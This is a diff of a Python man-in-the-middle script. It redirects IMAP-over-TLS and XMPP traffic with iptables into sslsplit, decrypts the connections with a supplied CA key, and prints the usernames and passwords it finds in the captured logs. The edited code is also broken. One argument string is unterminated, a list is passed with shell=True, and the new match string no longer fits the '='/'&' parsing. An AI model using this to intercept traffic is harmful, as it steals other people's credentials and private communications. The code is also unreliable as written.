@@ -99,8 +99,9 @@ def enable_port_forwarding():
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
     # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
-    proc = subprocess.Popen(
-        ["sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
+    # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
+    proc = subprocess.call(
+        ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
         stdout=subprocess.DEVNULL,
         shell=True)
 
@@ -196,10 +197,10 @@ if __name__ == "__main__":
             for file in os.listdir("logdir/"):
                 with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
-                        if ('username=' in line) and ("password=" in line):
+                        if ('username: ' in line) and (" password: " in line):
                             a = [m.start() for m in re.finditer("&", line)]
                             b = [m.start() for m in re.finditer("=", line)]
-                            print(a, b)
+                            # print(a, b)
                             print(line[b[0]+1:a[0]], line[b[1]+1:a[1]])
                             break
             sleep(2)
